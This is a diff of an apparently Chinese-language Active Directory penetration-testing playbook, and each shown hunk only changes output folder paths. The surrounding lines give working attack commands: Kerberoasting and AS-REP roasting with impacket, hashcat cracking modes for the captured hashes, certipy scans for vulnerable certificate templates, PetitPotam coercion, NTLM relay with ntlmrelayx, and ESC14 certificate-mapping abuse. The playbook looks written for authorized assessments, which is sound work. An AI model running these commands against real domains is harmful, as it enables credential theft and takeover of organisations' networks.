@@ -20,12 +20,12 @@ nxc smb "$DC" --pass-pol -u '' -p ''        # 先看锁定阈值/密码策略
 ```bash
 impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC"          # 枚举，不请求票据
 impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
-  -request-user '<svc>' -outputfile evidence/kerb/kerb.hashes      # 降噪：单 SPN
+  -request-user '<svc>' -outputfile work/<case>/kerb/kerb.hashes      # 降噪：单 SPN
 impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
-  -request -outputfile evidence/kerb/kerb-all.hashes               # 全量，仅必要时
-hashcat -m 13100 evidence/kerb/kerb.hashes wordlist.txt   # RC4 TGS-REP
-hashcat -m 19700 evidence/kerb/kerb.hashes wordlist.txt   # AES128
-hashcat -m 19800 evidence/kerb/kerb.hashes wordlist.txt   # AES256
+  -request -outputfile work/<case>/kerb/kerb-all.hashes               # 全量，仅必要时
+hashcat -m 13100 work/<case>/kerb/kerb.hashes wordlist.txt   # RC4 TGS-REP
+hashcat -m 19700 work/<case>/kerb/kerb.hashes wordlist.txt   # AES128
+hashcat -m 19800 work/<case>/kerb/kerb.hashes wordlist.txt   # AES256
 ```
 
 判据：拿到可离线破解的 TGS **且**破解出明文，或该 hash 直接完成下一步（PtH/伪造需匹配 etype）。
@@ -35,11 +35,11 @@ hashcat -m 19800 evidence/kerb/kerb.hashes wordlist.txt   # AES256
 
 ```bash
 impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
-  -format hashcat -outputfile evidence/kerb/asrep.hashes
+  -format hashcat -outputfile work/<case>/kerb/asrep.hashes
 impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -request-user '<user>' \
-  -no-pass -format hashcat -outputfile evidence/kerb/asrep-one.hash
-hashcat -m 18200 evidence/kerb/asrep.hashes wordlist.txt   # RC4 AS-REP
-hashcat -m 19900 evidence/kerb/asrep.hashes wordlist.txt   # AES256
+  -no-pass -format hashcat -outputfile work/<case>/kerb/asrep-one.hash
+hashcat -m 18200 work/<case>/kerb/asrep.hashes wordlist.txt   # RC4 AS-REP
+hashcat -m 19900 work/<case>/kerb/asrep.hashes wordlist.txt   # AES256
 ```
 
 判据：破解出明文，或可直接用于预认证/离线复用。
@@ -101,7 +101,7 @@ impacket-getST -spn 'cifs/<target>' -impersonate administrator \
 
 ```bash
 certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
-certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output evidence/adcs/find
+certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output work/<case>/adcs/find
 ```
 
 记录：CA 名/主机、模板名、`Enroll` 权限、Client Auth / Any Purpose EKU、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`、manager approval、`Authorized Signatures`、`EDITF_ATTRIBUTESUBJECTALTNAME2`、HTTP 注册端点。
@@ -156,7 +156,7 @@ petitpotam.py <listener_ip> <target_ip>
 
 ```bash
 nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
-impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of work/<case>/relay
 ```
 
 - SMB→SMB 需目标未强制 signing；LDAP relay 需 LDAP signing 未强制；ADCS HTTP 需 EPA 未开。
@@ -226,7 +226,7 @@ impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay
 ### ESC14 显式证书映射（`altSecurityIdentities`）
 
 - 条件：目标账号 `altSecurityIdentities` 用弱显式映射（`X509:<I>…<S>…` 无序列号、或仅 `<S>`），或当前主体对该属性有写权限（GenericWrite/WriteProperty）。
-- 命令：`certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output evidence/adcs/find`（读映射）；`certipy req ... -template 'User' -upn "<target>@$DOMAIN"`；写路径用 `ldapmodify -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -f altsec.ldif`（写操作单独授权并备份原值）。
+- 命令：`certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output work/<case>/adcs/find`（读映射）；`certipy req ... -template 'User' -upn "<target>@$DOMAIN"`；写路径用 `ldapmodify -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -f altsec.ldif`（写操作单独授权并备份原值）。
 - 判据：证书仅凭 issuer+subject 就映射到目标账号，`certipy auth -pfx` 返回目标 TGT/ccache。
 - 失败判据：映射含 `<SR>`/SKI/SHA1 强绑定、签发 CA 与映射 issuer 不匹配、无写权限、写入被 SACL 保护拒。
 
